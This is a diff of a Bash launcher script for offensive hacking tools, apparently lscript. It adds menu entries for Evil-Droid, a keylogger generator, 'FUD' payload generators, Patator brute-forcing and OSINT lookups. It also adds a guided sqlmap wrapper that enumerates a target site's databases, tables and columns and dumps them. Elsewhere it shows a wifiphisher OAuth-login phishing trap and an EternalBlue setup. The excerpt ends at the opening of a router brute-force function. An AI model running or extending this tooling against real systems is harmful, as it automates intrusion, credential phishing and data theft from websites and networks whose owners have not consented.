@@ -3480,7 +3615,7 @@ function wifi_tools
 			fi
 		fi
 		cd
-	elif [[ "$APPP" = "30" ]]
+	elif [[ "$APPP" = "28" ]]
 	then
 		if [[ -d "/root/Gloom-Framework" ]]
 		then
@@ -3497,7 +3632,7 @@ function wifi_tools
 			fi
 		fi
 		cd
-	elif [[ "$APPP" = "31" ]]
+	elif [[ "$APPP" = "29" ]]
 	then
 		if [[ -f "/usr/bin/sechub" ]]
 		then
@@ -3513,7 +3648,7 @@ function wifi_tools
 			fi
 		fi
 		cd
-	elif [[ "$APPP" = "6" ]]
+	elif [[ "$APPP" = "7" ]]
 	then
 		if [[ -d "/root/hakkuframework" ]]
 		then
@@ -3580,7 +3715,7 @@ function wifi_tools
 			read INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
-				install_hakku
+				install_osrframework
 			else
 				continue
 			fi
@@ -3614,27 +3749,27 @@ function remote_access
 	printf '\033]2;REMOTE ACCESS\a'
 	if [[ -d /root/BeeLogger ]]
 	then
-		echo -e ""$YS" 1"$CE") BeeLogger             Generate keylogger"
+		echo -e ""$YS" 1"$CE") BeeLogger             Generate Gmail Emailing Keyloggers to Windows"
 	else
-		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"             Generate keylogger"
+		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"             Generate Gmail Emailing Keyloggers to Windows"
 	fi
 	if [[ -d /root/ezsploit ]]
 	then
-		echo -e ""$YS" 2"$CE") Ezsploit              Generate payloads for many platforms,listeners etc..."
+		echo -e ""$YS" 2"$CE") Ezsploit              Automation for metasploit"
 	else
-		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"              Generate payloads for many platforms,listeners etc..."
+		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"              Automation for metasploit"
 	fi
 	if [[ -d /root/pupy ]]
 	then
-		echo -e ""$YS" 3"$CE") Pupy                  Generate payloads for many platforms,listeners etc..."
+		echo -e ""$YS" 3"$CE") Pupy                  Remote administration and post-exploitation tool"
 	else
-		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"                  Generate payloads for many platforms,listeners etc..."
+		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"                  Remote administration and post-exploitation tool"
 	fi
 	if [[ -d /root/zirikatu ]]
 	then
-		echo -e ""$YS" 4"$CE") Zirikatu              Generate undetectable payloads"
+		echo -e ""$YS" 4"$CE") Zirikatu              Fud Payload generator script"
 	else
-		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"              Generate undetectable payloads"
+		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"              Fud Payload generator script"
 	fi
 	if [[ -d /root/TheFatRat ]]
 	then
@@ -3761,6 +3896,12 @@ function remote_access
 		echo -e ""$YS"25"$CE") Beef                  The browser exploitation framework"
 	else
 		echo -e ""$RS"25"$CE") "$RS"Beef"$CE"                   The browser exploitation framework"
+	fi
+	if [[ -d /root/Evil-Droid ]]
+	then
+		echo -e ""$YS"26"$CE") Evil-Droid            Penetrate android platforms"
+	else
+		echo -e ""$RS"26"$CE") "$RS"Evil-Droid"$CE"             Penetrate android platforms"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
@@ -3917,7 +4058,7 @@ function remote_access
 				$READAK
 				cd /root/avet
 				./build/"$AVE"
-				xdg-open /root/avet
+				gio open /root/avet
 			fi
 		else
 			echo -e "$TNI"
@@ -4436,6 +4577,22 @@ function remote_access
 				continue
 			fi
 		fi
+	elif [[ "$KEYLOG" = "26" ]]
+	then
+		if [[ -d /root/Evil-Droid ]]
+		then
+			cd /root/Evil-Droid
+			./evil-droid
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_evil_droid
+			else
+				continue
+			fi
+		fi
 	elif [[ "$KEYLOG" = "8" ]]
 	then
 		if [[ -d /root/CHAOS ]]
@@ -4759,39 +4916,45 @@ function information_gathering
 		printf '\033]2;INFORMATION GATHERING\a'
 		if [[ -d /usr/share/sniper ]]
 		then
-			echo -e ""$YS" 1"$CE") Sniper"
+			echo -e ""$YS" 1"$CE") Sniper                Automated Pentest Recon Scanner"
 		else
-			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE""
+			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE"                Automated Pentest Recon Scanner"
 		fi
 		if [[ -d /root/ReconDog ]]
 		then
-			echo -e ""$YS" 2"$CE") ReconDog"
+			echo -e ""$YS" 2"$CE") ReconDog              All in one tool"
 		else
-			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE""
+			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE"              All in one tool"
 		fi
 		if [[ -d /root/RED_HAWK ]]
 		then
-			echo -e ""$YS" 3"$CE") RED HAWK"
+			echo -e ""$YS" 3"$CE") RED HAWK              All in one tool"
 		else
-			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE""
+			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE"              All in one tool"
 		fi
 		if [[ -d /root/Infoga ]]
 		then
-			echo -e ""$YS" 4"$CE") Infoga"
+			echo -e ""$YS" 4"$CE") Infoga                Email Information Gathering"
 		else
-			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE""
+			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE"                Email Information Gathering"
 		fi
 		if [[ -d /root/KnockMail ]]
 		then
-			echo -e ""$YS" 5"$CE") KnockMail"
+			echo -e ""$YS" 5"$CE") KnockMail             Verify if email exists"
 		else
-			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE""
+			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE"             Verify if email exists"
 		fi
 		if [[ -d /root/operative-framework ]]
 		then
-			echo -e ""$YS" 6"$CE") Operative-framework"
+			echo -e ""$YS" 6"$CE") Operative-framework   Get information on website or target"
 		else
-			echo -e ""$RS" 6"$CE") "$RS"Operative-framework"$CE""
+			echo -e ""$RS" 6"$CE") "$RS"Operative-framework"$CE"   Get information on website or target"
+		fi
+		if [[ -d /root/osrframework ]]
+		then
+			echo -e ""$YS" 7"$CE") Osrfconsole           Perform accurate online researches"
+		else
+			echo -e ""$RS" 7"$CE") "$RS"Osrfconsole"$CE"           Perform accurate online researches"
 		fi
 		echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS"00"$CE") Main menu"
@@ -4914,6 +5077,78 @@ function information_gathering
 				fi
 
 			fi
+		elif [[ "$INFOG" = "7" ]]
+		then
+			if [[ -d "/root/hakkuframework" ]]
+			then
+				while true
+				do
+					printf '\033]2;OSRFCONSOLE\a'
+					clear
+					echo -e ""$YS" 1"$CE") usufy"
+					echo -e ""$YS" 2"$CE") mailfy"
+					echo -e ""$YS" 3"$CE") searchfy"
+					echo -e ""$YS" 4"$CE") domainfy"
+					echo -e ""$YS" 5"$CE") phonefy"
+					echo -e ""$YS" 6"$CE") entify"
+					echo -e ""$YS" b"$CE") Go back"
+					echo -e ""$YS"00"$CE") Main menu"
+				#	echo -e ""$YS" 0"$CE") EXIT"
+					echo -e "Choose: "
+					read -e OSFR
+					clear
+					if [[ "$OSFR" = "1" ]]
+					then
+						echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
+						usufy.py
+						exit
+					elif [[ "$OSFR" = "2" ]]
+					then
+						echo -e "Use: mailfy.py -n name1"
+						mailfy.py
+						exit
+					elif [[ "$OSFR" = "3" ]]
+					then
+						searchfy.py
+						exit
+					elif [[ "$OSFR" = "4" ]]
+					then
+						domainfy.py
+						exit
+					elif [[ "$OSFR" = "5" ]]
+					then
+						phonefy.py
+						exit
+					elif [[ "$OSFR" = "6" ]]
+					then
+						entify.py
+						exit
+					elif [[ "$OSFR" = "0" ]]
+					then
+						exit
+					elif [[ "$OSFR" = "00" ]]
+					then
+						exec bash "$0"
+					elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
+					then
+						break
+					else 
+						echo -e "Wrong choice"
+						sleep 0.3
+						clear
+						exec bash "$0"
+					fi
+				done
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_osrframework
+				else
+					continue
+				fi
+			fi
 		elif [[ "$INFOG" = 0 ]]
 		then
 			exit
@@ -4926,6 +5161,101 @@ function information_gathering
 		fi
 		echo -e "$PAKTGB"
 		$READAK
+	done
+}
+function website_tools
+{
+	while true 
+	do
+		clear
+		TERMINALTITLE="WEBSITE TOOLS"
+		dash_calc
+		printf '\033]2;WEBSITE TOOLS\a'
+		if [[ -f /usr/bin/sqlmap ]]
+		then
+			echo -e ""$YS" 1"$CE") SQLmap                Automatic SQL injection and database takeover tool"
+		else
+			echo -e ""$RS" 1"$CE") "$RS"SQLmap"$CE"                Automatic SQL injection and database takeover tool"
+		fi
+		if [[ -d /root/leviathan ]]
+		then
+			echo -e ""$YS" 2"$CE") Leviathan             Wide range mass audit toolkit"
+		else
+			echo -e ""$RS" 2"$CE") "$RS"Leviathan"$CE"             Wide range mass audit toolkit"
+		fi
+		if [[ -d /root/NoSQLMap ]]
+		then
+			echo -e ""$YS" 3"$CE") NoSQLMap              Automated NoSQL exploitation tool"
+		else
+			echo -e ""$RS" 3"$CE") "$RS"NoSQLMap"$CE"              Automated NoSQL exploitation tool"
+		fi
+		echo -e ""$YS" b"$CE") Go back"
+		echo -e ""$YS"00"$CE") Main menu"
+		echo -e "Choose: "
+		read WEB
+		clear
+		if [[ "$WEB" = 1 ]]
+		then
+			if [[ -f /usr/bin/sqlmap ]]
+			then
+				sqlmap_menu
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_sqlmap
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 2 ]]
+		then
+			if [[ -d /root/leviathan ]]
+			then
+				cd /root/leviathan
+				python leviathan.py
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_leviathan
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 3 ]]
+		then
+			if [[ -d /root/NoSQLMap ]]
+			then
+				cd /root/NoSQLMap
+				python nosqlmap.py
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_nosqlmap
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = "" ]]
+		then
+			continue
+		elif [[ "$WEB" = 0 ]]
+		then
+			exit
+		elif [[ "$WEB" = 00 ]]
+		then
+			exec bash $0
+		elif [[ "$WEB" = "back" || "$WEB" = "b" ]]
+		then
+			break
+		fi
+		#~ echo -e "$PAKTGB"
+		#~ $READAK
 	done
 }
 function other_tools
@@ -4971,6 +5301,12 @@ do
 		echo -e ""$YS" 6"$CE") Hash Buster      Hash cracker"
 	else
 		echo -e ""$RS" 6"$CE") "$RS"Hash Buster"$CE"      Hash cracker"
+	fi
+	if [[ -d /root/patator ]]
+	then
+		echo -e ""$YS" 7"$CE") Patator          Bruteforcer"
+	else
+		echo -e ""$RS" 7"$CE") "$RS"Patator"$CE"          Bruteforcer"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") EXIT"
@@ -5074,6 +5410,23 @@ do
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_hashbuster
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "7" ]]
+	then
+		if [[ -d "/root/patator" ]]
+		then
+			patator_automation
+			echo -e "$PAKTGB"
+			$READAK	
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_patator
 			else
 				continue
 			fi
@@ -5514,8 +5867,9 @@ function tools_menu
 	echo -e ""$YS" 1"$CE") Wifi tools"
 	echo -e ""$YS" 2"$CE") Remote access"
 	echo -e ""$YS" 3"$CE") Information gathering"
-	echo -e ""$YS" 4"$CE") Others"
-	echo -e ""$YS" 5"$CE") Install/reinstall a tool"
+	echo -e ""$YS" 4"$CE") Webside tools"
+	echo -e ""$YS" 5"$CE") Others"
+	echo -e ""$YS" 6"$CE") Install/reinstall a tool"
 	echo -e ""$YS" i"$CE") Info"
 	echo -e ""$YS" b"$CE") Go back"
 	#~ echo -e ""$YS"00"$CE") Main menu"
@@ -5534,8 +5888,11 @@ function tools_menu
 			information_gathering
 		elif [[ "$CATEG" = "4" ]]
 		then
-			other_tools
+			website_tools
 		elif [[ "$CATEG" = "5" ]]
+		then
+			other_tools
+		elif [[ "$CATEG" = "6" ]]
 		then
 			reinstall_tools
 		elif [[ "$CATEG" = "0" ]]
@@ -5577,15 +5934,18 @@ function tools_menu
 function public_ip
 {
 	clear
+	echo -e ""$BS"Please wait..."$CE""
 	CHECKMON=$(ifconfig | grep "mon")
 	if [[ "$CHECKMON" = "" ]]
 	then
+		clear
 		PUBLICIP=$(curl -s ipinfo.io/ip)
 		if [[ "$PUBLICIP" = "" ]]
 		then
 			PUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
 			if [[ "$PUBLICIP" = "" ]]
 			then
+				clear
 				PUBLICIP="Connection error."
 			fi
 		fi
@@ -5631,8 +5991,18 @@ function eternalblue
 	then
 		mkdir	"$LPATH"/rce
 	fi
-	echo -e "LHOST: "
+	EG=$(local_ips $WLANN)
+	if [[ "$EG" != "" ]]
+	then
+		echo -e "LHOST: ("$YS""Enter""$CE"="$EG") "
+	else
+		echo -e "LHOST: "
+	fi
 	read LHOSTL
+	if [[ "$EG" != "" && "$LHOSTL" = "" ]]
+	then
+		LHOSTL="$EG"
+	fi
 	echo -e "RHOST: "
 	read RHOSTL
 	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
@@ -5874,65 +6244,73 @@ done
 }
 function new_terminal
 {
-		while true
-		do
+	while true
+	do
+	clear
+	if [[ "$ALFA" = "yes" ]]
+	then
+		CHECKMON=$(iwconfig "$WLANN" | grep "Mode:Monitor")
+	else
+		CHECKMON=$(ifconfig | grep "$WLANNM")
+	fi
+	clear
+	if [[ "$CHECKMON" = "" ]]
+	then
+		echo -e "Monitor mode is not enabled."
+		echo -e ""
+		echo -e "Do you want to enable monitor mode? "$YNYES": "
+		read MONITOREN
 		clear
-		if [[ "$ALFA" = "yes" ]]
+		if [[ "$MONITOREN" = "n" ]]
 		then
-			CHECKMON=$(iwconfig "$WLANN" | grep "Mode:Monitor")
-		else
-			CHECKMON=$(ifconfig | grep "$WLANNM")
-		fi
-		clear
-		if [[ "$CHECKMON" = "" ]]
-		then
-			echo -e "Monitor mode is not enabled."
-			echo -e ""
-			echo -e "Do you want to enable monitor mode? "$YNYES": "
-			read MONITOREN
+		#~ echo -e "Select 'start' or '2' to enable it"
+			echo -e "$PAKTGB"
+			$READAK
 			clear
-			if [[ "$MONITOREN" = "n" ]]
-			then
-			#~ echo -e "Select 'start' or '2' to enable it"
-				echo -e "$PAKTGB"
-				$READAK
-				clear
-				exec bash "$0"
-			else
-				start_menu
-				continue
-			fi
+			exec bash "$0"
 		else
-			if [[ "$YORNAA" = "10" ]]
+			CHECKWL=$(ifconfig | grep "$WLANN")
+			if [[ "$CHECKWL" == "" ]]
 			then
-				echo -e "Moving into new terminal..."
-				sleep 1
-				FJC=0
-				export FJC
-				gnome-terminal --geometry 87x35+9999+0 -- lh1
-				sleep 1
-				exec bash "$0"
-				break
-			elif [[ "$YORNAA" = "11" ]]
-			then
-				clear
-				echo -e "Moving into new terminal..."
-				sleep 1
-				gnome-terminal --geometry 80x25+9999+0 -- lh3
-				sleep 1
-				exec bash "$0"
-				break
-			elif [[ "$YORNAA" = "12" ]]
-			then
-				echo -e "Moving into new terminal..."
-				sleep 1
-				gnome-terminal --geometry 80x25+9999+0 -- lh4
-				sleep 1
-				exec bash "$0"
+				echo -e ""$RS""$WLANN" was not found"$CE""
+				sleep 2
+				BACKL=1
 				break
 			fi
+			start_menu
+			continue
 		fi
-		done
+	else
+		if [[ "$YORNAA" = "10" ]]
+		then
+			echo -e "Moving into new terminal..."
+			sleep 1
+			FJC=0
+			export FJC
+			gnome-terminal --geometry 87x35+9999+0 -- lh1
+			sleep 1
+			exec bash "$0"
+			break
+		elif [[ "$YORNAA" = "11" ]]
+		then
+			clear
+			echo -e "Moving into new terminal..."
+			sleep 1
+			gnome-terminal --geometry 80x25+9999+0 -- lh3
+			sleep 1
+			exec bash "$0"
+			break
+		elif [[ "$YORNAA" = "12" ]]
+		then
+			echo -e "Moving into new terminal..."
+			sleep 1
+			gnome-terminal --geometry 80x25+9999+0 -- lh4
+			sleep 1
+			exec bash "$0"
+			break
+		fi
+	fi
+	done
 }
 function check_if_ks
 {
@@ -5965,6 +6343,503 @@ function wififb
 	read -e ESSIDAP
 	export ESSIDAP
 	xterm -hold -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
+}
+function sqlmap_menu
+{
+file2="/root/lscript/sqltemp2"
+file3="/root/lscript/sqltemp3"
+file4="/root/lscript/sqltemp34"
+while true
+do
+	clear
+	TERMINALTITLE="SQLMAP"
+	dash_calc
+	printf '\033]2;SQLMAP\a'
+	if [[ "$URL" = "" ]]
+	then
+		URL=""$RS"None"$CE""
+		urls=0
+	fi
+	if [[ "$FDBS" = "" ]]
+	then
+		FDBS=""$RS"None"$CE""
+		fdbss=0
+	fi
+	if [[ "$SD" = "" ]]
+	then
+		SD=""$RS"None"$CE""
+		sds=0
+	fi
+	if [[ "$TB" = "" ]]
+	then
+		TB=""$RS"None"$CE""
+		tbs=0
+	fi
+	if [[ "$ST" = "" ]]
+	then
+		ST=""$RS"None"$CE""
+		sts=0
+	fi
+	if [[ "$CL" = "" ]]
+	then
+		CL=""$RS"None"$CE""
+		cls=0
+	fi
+	if [[ "$SC" = "" ]]
+	then
+		SC=""$RS"None"$CE""
+		scs=0
+	fi
+	echo -e ""$YS" 1"$CE") URL                         Current:"$YS"$URL"$CE""
+	if [[ "$urls" = 0 ]]
+	then
+		echo -e ""$RS" 2"$CE") Fetch databases             Current:$FDBS"
+	else
+		echo -e ""$YS" 2"$CE") Fetch databases             Current:$FDBS"
+	fi
+	if [[ "$fdbss" = 0 ]]
+	then
+		echo -e ""$RS" 3"$CE") Select database             Current:"$YS"$SD"$CE""
+	else
+		echo -e ""$YS" 3"$CE") Select database             Current:"$YS"$SD"$CE""
+	fi
+	if [[ "$sds" = 0 ]]
+	then
+		echo -e ""$RS" 4"$CE") Fetch tables                Current:"$YS"$TB"$CE""
+	else
+		echo -e ""$YS" 4"$CE") Fetch tables                Current:"$YS"$TB"$CE""
+	fi
+	if [[ "$tbs" = 0 ]]
+	then
+		echo -e ""$RS" 5"$CE") Select table                Current:"$YS"$ST"$CE""
+	else
+		echo -e ""$YS" 5"$CE") Select table                Current:"$YS"$ST"$CE""
+	fi
+	if [[ "$sts" = 0 ]]
+	then
+		echo -e ""$RS" 6"$CE") Fetch columns               Current:"$YS"$CL"$CE""
+	else
+		echo -e ""$YS" 6"$CE") Fetch columns               Current:"$YS"$CL"$CE""
+	fi
+	if [[ "$cls" = 0 ]]
+	then
+		echo -e ""$RS" 7"$CE") Select columns              Current:"$YS"$SC"$CE""
+	else
+		echo -e ""$YS" 7"$CE") Select columns              Current:"$YS"$SC"$CE""
+	fi
+	if [[ "$scs" = 0 ]]
+	then
+		echo -e ""$RS" s"$CE") Start"
+	else
+		echo -e ""$YS" s"$CE") Start"
+	fi
+	echo -e ""$YS" b"$CE") Go back"
+	echo -e "Choose: "
+	read SQ
+	clear
+	if [[ "$SQ" = 1 ]]
+	then
+		echo -n "URL: "
+		read URLL
+		if [[ "$URLL" != "" || "$URLL" = "b" ]]
+		then
+			URL="$URLL"
+			urls=1
+				##Clearing nexts
+				FDBS=""
+				fdbss=0
+				SD=""
+				sds=0
+				TB=""
+				tbs=0
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+		fi
+	elif [[ "$SQ" = "s" ]]
+	then
+		if [[ "$scs" = 0 ]]
+		then
+			echo -e ""$RS"No columns selected"$CE""
+			sleep 2
+			break
+		fi
+		#~ export URL
+		#~ export SD
+		#~ export ST
+		#~ export SC
+		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
+		echo -e ""
+		echo -e ""$YS"A log file has been created on "$file4". Copy it before it gets overwritten"$CE""
+		echo -e ""
+		echo -e "$PAKTGB"
+		$READAK
+	elif [[ "$SQ" = "b" ]]
+	then
+		break
+	elif [[ "$SQ" = 00 ]]
+	then
+		exec bash $0
+	elif [[ "$SQ" = 7 ]]
+	then
+		if [[ "$cls" = 0 ]]
+		then
+			echo -e ""$RS"Columns not fetched"$CE""
+			sleep 2
+			break
+		fi
+		n10=1
+		CCO1="$CO1"
+		while [[ "$n10" -le "$NCO" ]]
+		do
+			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
+			CCO1=$((CCO1+1))
+			n10=$((n10+1))
+		done
+		while true
+		do
+			clear
+			echo -e ""$BS"Columns: "$CE""
+			v=1
+			while [[ "$v" -le "$NCO" ]]
+			do
+				if [[ "${selc[$v]}" = 1 ]]
+				then
+					SSC="$YS"
+				else
+					SSC="$WS"
+				fi
+				if [[ "$v" -le 9 ]]
+				then
+					echo -e ""$YS"  $v"$CE") "$SSC"${cl[$v]}"$CE""
+				elif [[ "$v" -le 99 ]]
+				then
+					echo -e ""$YS" $v"$CE") "$SSC"${cl[$v]}"$CE""
+				else
+					echo -e ""$YS"$v"$CE") "$SSC"${cl[$v]}"$CE""
+				fi
+				v=$((v+1))
+			done
+			echo -e ""$YS" d"$CE") Deselect all"
+			echo -e ""$YS" s"$CE") Save selection"
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read COCH
+			clear
+			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
+			then
+				break
+			elif [[ "$COCH" = "s" ]] 
+			then
+				v2=1
+				SC=""
+				while [[ "$v2" -le "$NCO" ]]
+				do
+					if [[ "${selc[$v2]}" = 1 ]]
+					then
+						if [[ "$SC" = "" ]]
+						then
+							SC="${cl[$v2]}"
+						else
+							SC=""$SC","${cl[$v2]}""
+						fi
+					fi
+					v2=$((v2+1))
+				done
+				if [[ "$SC" = "" ]]
+				then
+					echo -e ""$RS"Nothing selected"$CE""
+					ssc=0
+					sleep 2
+				else
+					ssc=1
+				fi
+				break
+			elif [[ "$COCH" = "d" ]] 
+			then
+				v1=1
+				while [[ "$v1" -le "$NCO" ]]
+				do
+					selc[$v1]=""
+					v1=$((v1+1))
+				done
+			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
+			then
+				echo -e ""$RS"Wrong choice"$CE""
+				sleep 2
+				continue
+			else
+				if [[ "${selc[$COCH]}" != 1 ]]
+				then
+					selc[$COCH]=1
+				else
+					selc[$COCH]=""
+				fi
+			fi
+		done
+	elif [[ "$SQ" = 6 ]]
+	then
+		while true
+		do
+			if [[ "$sts" = 0 ]]
+			then
+				echo -e ""$RS"Table not selected"$CE""
+				sleep 2
+				break
+			fi
+			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
+			##finding columns
+			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
+			CO1=$(echo $CO | cut -d ' ' -f2)
+			CO1=$((CO1+1))
+			CO2=$(echo $CO | cut -d ' ' -f3)
+			CO2=$((CO2-1))
+			NCO=$((CO2-CO1))
+			if [[ "$NCO" -le 0 ]]
+			then
+				echo -e ""$RS"Error 24. No columns found automatically"$CE""
+				sleep 2
+				cls=0
+				continue
+			else
+				if [[ "$NCO" = 1 ]]
+				then
+					echo -e ""$YS"1 column found!"$CE""
+					sleep 2
+				else
+					echo -e ""$YS""$NCO" columns found!"$CE""
+					sleep 2
+				fi
+				CL="Done"
+				cls=1
+				break
+			fi
+		done
+	elif [[ "$SQ" = 5 ]]
+	then
+		while true
+		do
+			if [[ "$tbs" = 0 ]]
+			then
+				echo -e ""$RS"Tables not fetched"$CE""
+				sleep 2
+				break
+			fi
+			echo -e ""$BS"Tables: "$CE""
+			n9=1
+			CC1="$C1"
+			while [[ "$n9" -le "$NTB" ]]
+			do
+				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
+				if [[ "$n9" -le 9 ]]
+				then
+					echo -e ""$YS"  $n9"$CE") ${tb[$n9]}"
+				elif [[ "$n9" -le 99 ]]
+				then
+					echo -e ""$YS" $n9"$CE") ${tb[$n9]}"
+				else
+					echo -e ""$YS"$n9"$CE") ${tb[$n9]}"
+				fi
+				CC1=$((CC1+1))
+				n9=$((n9+1))
+			done
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read TCH
+			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
+			then
+				break
+			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
+			then
+				echo -e ""$RS"Wrong choice"$CE""
+				sleep 2
+				continue
+			else
+				ST="${tb[$TCH]}"
+				sts=1
+				##Clearing nexts
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+				break
+			fi
+		done
+	elif [[ "$SQ" = 4 ]]
+	then
+		if [[ "$sds" = 0 ]]
+		then
+			echo -e ""$RS"Databases not selected"$CE""
+			sleep 2
+			continue
+		fi
+		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
+		##finding tables
+		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
+		C1=$(echo $C | cut -d ' ' -f1)
+		C1=$((C1+1))
+		C2=$(echo $C | cut -d ' ' -f2)
+		C2=$((C2-1))
+		NTB=$((C2-C1))
+		if [[ "$NTB" -le 0 ]]
+		then
+			echo -e ""$RS"Error 23. No tables found automatically"$CE""
+			sleep 2
+			tbs=0
+			continue
+		else
+			if [[ "$NTB" = 1 ]]
+			then
+				echo -e ""$YS"1 table found!"$CE""
+				sleep 2
+			else
+				echo -e ""$YS""$NTB" tables found!"$CE""
+				sleep 2
+			fi
+			TB="Done"
+			tbs=1
+				##Clearing nexts
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+		fi
+	elif [[ "$SQ" = 3 ]]
+	then
+		while true
+		do
+			if [[ "$fdbss" = 0 ]]
+			then
+				echo -e ""$RS"Databases not fetched"$CE""
+				sleep 2
+				continue
+			fi
+			echo -e ""$BS"Databases: "$CE""
+			n8=1
+			while [[ "$n8" -le "$NDB" ]]
+			do
+				if [[ "$n8" -le 9 ]]
+				then
+					echo -e ""$YS"  "$n8""$CE") ${db[$n8]}"
+				elif [[ "$n8" -le 99 ]]
+				then
+					echo -e ""$YS" "$n8""$CE") ${db[$n8]}"
+				else
+					echo -e ""$YS""$n8""$CE") ${db[$n8]}"
+				fi
+				n8=$((n8+1))
+			done
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read DCH
+			clear
+			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
+			then
+				break
+			fi
+			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
+			then
+				echo -e ""$RS"Wrong choice"$CE""
+				sleep 2
+			else
+				SD="${db[$DCH]}"
+				sds=1
+					##Clearing nexts
+					TB=""
+					tbs=0
+					ST=""
+					sts=0
+					cls=0
+					CL=""
+					scs=0
+					SC=""
+				break
+			fi	
+		done
+	elif [[ "$SQ" = 2 ]]
+	then
+		if [[ "$urls" != 1 ]]
+		then
+			echo -e ""$RS"URL not selected"$CE""
+			sleep 2
+			continue
+		fi
+		file="/root/lscript/sqltemp"
+		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
+		##Find the line
+		CHECK=$(cat "$file" | grep "available databases ")
+		if [[ "$CHECK" = "" ]]
+		then
+			fdbss=0
+			echo -e ""$RS"No databases found or not vulnerable website"$CE""
+			fdbss=0
+			echo -e "$PAKTGB"
+			$READAK
+			continue
+		fi
+		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
+		LINED=$((LINED+1))
+		##list databases
+		n=0
+		echo -e ""BS"Calculating..."$CE""
+		while true
+		do
+			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
+			if [[ "$CH" = "" ]]
+			then
+				break
+			else
+				##how many dbs found
+				n=$((n+1))
+				##next line
+				LINED=$((LINED+1))
+			fi
+			CHH=$(echo "$CH" | awk -F "] " {'print $2'})
+			if [[ "$CHH" = "" ]]
+			then
+				echo -e ""$RS"Error 21"$CE""
+				CHH=""$RS"Error"$CE""
+				sleep 3
+			fi
+			db[$n]="$CHH"
+		done
+		sleep 1
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$RS"Error 22 No databases found automatically"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+			continue
+		elif [[ "$n" = 1 ]]
+		then
+			echo -e ""$YS"1 database found!"$CE""
+			sleep 1
+		else
+			echo -e ""$YS"$n databases found!"$CE""
+			sleep 1
+		fi
+		echo -e ""
+		FDBS=""$YS"Done"$CE""
+		fdbss=1
+		NDB="$n"
+				##Clearing nexts
+				SD=""
+				sds=0
+				TB=""
+				tbs=0
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+	fi	
+done
 }
 function mitmf_hook
 {
@@ -6042,8 +6917,274 @@ function mitmf_hook
 	fi
 	cd
 }
+function bruteforce_router
+{
+while true
+do
